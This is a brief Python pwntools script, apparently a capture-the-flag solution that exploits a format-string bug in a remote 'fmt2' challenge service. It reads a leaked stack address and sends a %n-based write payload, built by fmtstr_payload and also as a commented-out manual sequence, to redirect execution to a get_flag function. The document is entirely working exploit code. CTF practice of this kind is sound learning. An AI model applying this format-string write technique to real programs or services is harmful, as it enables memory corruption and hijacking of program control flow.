
from pwn import *

context.update(arch='i386', os='linux')
# r = process('./fmt2')
r = remote('bamboofox.cs.nctu.edu.tw', 10105)

leak = int(r.recvline().split()[5][:-1], 16)

get_flag = 0x804861D

# p = p32(leak)
# p += p32(leak+1)
# p += p32(leak+2)
# p += p32(leak+3)
# p += '%{}c%7$n'.format(0x1D-16).encode()
# p += '%{}c%8$n'.format(105).encode()
# p += '%{}c%9$n'.format(126).encode()
# p += '%{}c%10$n'.format(260).encode()

# r.sendline(p)

r.sendline(fmtstr_payload(7, {leak: get_flag}))

print(r.recv())

